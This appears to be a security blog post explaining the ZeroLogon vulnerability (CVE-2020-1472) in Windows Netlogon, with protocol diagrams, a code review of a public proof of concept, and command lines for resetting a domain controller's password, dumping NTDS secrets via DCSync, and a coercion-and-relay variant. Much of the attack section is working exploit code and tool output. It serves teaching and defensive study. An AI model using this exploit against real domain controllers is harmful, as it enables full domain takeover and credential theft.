---
title: "ZeroLogon 101 (CVE-2020-1472)"
layout: "post"
categories: "Windows"
tags: ["Active Directory", "NTLM", "Cryptography", "Code Review"]
---

ZeroLogon aka CVE-2020-1472 is a vulnerability, found on 14th September 2020 by [Secura](https://www.secura.com/) researchers, that abuses the Netlogon Remote Protocol ([MS-NRPC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f)) RPC interface using an insecure cryptographic primitive.

## Exploitation requirements

To exploit this vulnerability, the attacker only needs internal network access to reach the EPM (DCE/RPC Endpoint Mapper) of the vulnerable domain controller (DC).

## How does the attack work?

The attack can be summarized in 6 steps:

- **1.** The attacker will attempt to establish a Secure Channel (SChannel) using the Netlogon service by sending a [NetrServerReqChallenge](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/5ad9db9f-7441-4ce5-8c7b-7b771e243d32) request to the DC (Domain Controller) with a Client Challenge of 8 null bytes:

![](/assets/posts/2023-07-10-zerologon/wireshark1.png)

- **2.** The DC returns a `NetrServerReqChallenge` response with a Server Challenge (random value of 8 bytes):

![](/assets/posts/2023-07-10-zerologon/wireshark2.png)

- **3.** The 2 interlocutors generate a Session Key using a Key Derivation Function (KDF) which uses a concatenation of previously exchanged challenges and the hash of the client's account.

- **4.** The client sends a [NetrServerAuthenticate3](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9) request to the DC, which globally contains:

![](/assets/posts/2023-07-10-zerologon/wireshark3.png)

1. An Account Name, the NetBIOS name of the server's machine account:
In our case, the DC machine account.

2. A Client Credential, encrypted with the Session Key and Client Challenge using the `ComputeNetlogonCredential` function:
Here, 8 null bytes.

3. Negotiation options, flags for negotiating the signature and authenticity of RPC communications with the server:
The value will therefore be `0x212fffff` for Netlogon signing and sealing disabled.

[ComputeNetlogonCredential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/13db7494-6d2c-4448-be8f-cb5ba03e95d6) function uses AES-CFB8 encryption (8-bit cipher feedback) with an IV equal to 0.

To sum up, with a static and null IV, there is a 1 in 256 chance that each block of the ciphertext will be equal to 0 if the plaintext is equal to 0:

![](/assets/posts/2023-07-10-zerologon/aes-cfb8-problem.jpg)

- **5.** The DC in turn calculates the Client Credential and compares it with the one received. The above steps are repeated (around 256 attempts) until the Session Key yields a Client Challenge of 8 null bytes server-side. In this way, the client can impersonate the DC's machine account, setting up a SChannel Netlogon (no problem for brute-force, as machine accounts have alphanumeric passwords longer than 64 characters, unlike user accounts). If this happens, the DC sends the client a `NetrServerAuthenticate3` response with a Server Credential encrypted with the Session Key and Server Challenge:

![](/assets/posts/2023-07-10-zerologon/wireshark4.png)

- **6.** The client can now send a [NetrServerPasswordSet2](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81) request to set a null password for the DC machine account:

![](/assets/posts/2023-07-10-zerologon/wireshark5.png)

## TL ; DR

![](/assets/posts/2023-07-10-zerologon/schema_tldr.png)

The DC machine account has [DS-Replication-Get-Changes](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes) and [DS-Replication-Get-Changes-All](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all) rights. The attacker can now carry out a DCSync attack, which consists in simulating a replication process by sending an [IDL_DRSGetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) request to the DRSUAPI to replicate LDAP directory objects in a given naming context (NC), in order to recover Kerberos keys as well as the secrets contained in the `NTDS.dit` database, in particular the NT hash of user krbtgt and Domain Admin (DA).

## Method 1 - Password change technique

> This method illustrates the technique presented in the vulnerability description above.

Set an empty password to the DC machine account with the dirkjanm PoC:

```py
❯ python3 cve-2020-1472-exploit.py DC_account DC_IP_address
Performing authentication attempts...
=============================================================================================================================================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

DCSync to recover the secrets contained in `NTDS.dit` with [secretsdump tool from the Impacket suite](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py):

```py
❯ secretsdump.py 'Domain'/'DC_account$'@DC_IP_address -no-pass

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1e0e867ab8043bbba9ef4639dbdf562e:::
<...snip...>
```

> However, this process presents [several risks](https://twitter.com/_dirkjan/status/1306280553281449985) :
{: .prompt-danger }

1. Servers will no longer be able to connect to the domain via NTLM, as they have no knowledge of the secret changed by the attacker.
2. Kerberos tickets issued by TGS before the exploit will still work, but new ones will be encrypted with the secret changed by the attacker. Servers will not be able to check ST (Service Tickets) requested from the KDC.
3. The same problem applies to Kerberos authentication on the DC, since the change is made only in `NTDS.dit` and not in the `SAM` database, the `HKLM\SECURITY\Policy\Secrets\$machine.ACC` registry key or the `LSASS` process.

It is therefore imperative to restore the previously changed password:

```py
❯ python3 restorepassword.py 'Domain'/'DC_account'@'Domain_controller' -target-ip 'DC_IP_address' -hexpass 'DC_hexpass'

[*] StringBinding ncacn_ip_tcp:IP[49674]
Change password OK
```

### Review of dirkjanm's PoC

- **Lines 3-5**: Import of various classes from the `impacket.dcerpc.v5` module:

* `nrpc`: interact with the MS-NRPC protocol.
* `epm`: interact with the Endpoint Mapper (EPM), to map RPC communication endpoints.
* `NULL`: a constant representing a null value.
* `transport`: establish and manage transport connections using the DCE/RPC protocol.

```py
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
```

- **Lines 69-73**: Establishes a connection to an RPC endpoint in order to communicate via the MS-NRPC protocol:

```py
rpc_con = None
binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
rpc_con.connect()
rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
```

- **Lines 74-80**: Makes a maximum of 2,000 attempts to establish a Secure Channel as a DC machine account:

```py
for attempt in range(0, MAX_ATTEMPTS):
    result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)

    if result is None:
        print('=', end='', flush=True)
    else:
        break
```

- **Lines 20-51**: Each attempt corresponds to:

* Send a `NetrServerReqChallenge` and `NetrServerAuthenticate3` request with Client Challenge and Client Credential equal to 8 null bytes.
* If the `NetrServerAuthenticate3` response returns an ErrorCode equal to 0, then the SChannel has been established and the `try_zero_authenticate` function returns `True`.
* If the response returns an Error Code equal to `0xc0000022`, i.e. `STATUS_ACCESS_DENIED`, then the SChannel has not been established and the function returns `None`.

```py
def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
    # Connect to the DC's Netlogon service.


    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer + '\x00', ciphertext, flags
        )


        # It worked!
        assert server_auth['ErrorCode'] == 0
        return True

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')
```

- **Lines 53-64**: Once the SChannel has been established between the attacker and the DC, we send a `NetrServerPasswordSet2` request with the following information:

* DC name
* SChannel type
* A [NETLOGON_AUTHENTICATOR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab) structure containing authentication information
* A new empty password

```py
def exploit(dc_handle, rpc_con, target_computer):
    request = nrpc.NetrServerPasswordSet2()
    request['PrimaryName'] = dc_handle + '\x00'
    request['AccountName'] = target_computer + '$\x00'
    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\x00' * 8
    authenticator['Timestamp'] = 0
    request['Authenticator'] = authenticator
    request['ComputerName'] = target_computer + '\x00'
    request['ClearNewPassword'] = b'\x00' * 516
    return rpc_con.request(request)
```

## Method 2 - Authentication relay technique

There is [an alternative way found by dirkjanm](https://dirkjanm.io/a-different-way-of-abusing-zerologon/) to exploit ZeroLogon that does not entail the risks presented in the 1st method. However, this method requires a domain account and 2 DCs. The principle consists in forcing authentication from one DC to our attacking machine, then relaying it to the second DC, which is vulnerable to ZeroLogon.

- **1 & 2**: Coerce an authentication of the DC1 machine account that has DCSync rights on DC2 by abusing the RPC call RFFPCNEX ([RpcRemoteFindFirstPrinterChangeNotificationEx](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)) of the [MS-RPRN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) protocol:

```c
DWORD RpcRemoteFindFirstPrinterChangeNotificationEx(
  [in] PRINTER_HANDLE hPrinter,
  [in] DWORD fdwFlags,
  [in] DWORD fdwOptions,
  [in, string, unique] wchar_t* pszLocalMachine,
  [in] DWORD dwPrinterLocal, // <=================== Path UNC vers la machine attaquante
  [in, unique] RPC_V2_NOTIFY_OPTIONS* pOptions
);
```

```py
❯ dementor.py -d $domain -u $user -p $password $attacker_ip $domain_controller_1
```

- **3 & 4**: Relay this forced authentication to exploit ZeroLogon on the DC2 by doing a DCSync without changing the password:

```py
❯ ntlmrelayx.py -t dcsync://$domain_controller_2 -smb2support
```

![](/assets/posts/2023-07-10-zerologon/zerologon_sploit.svg)
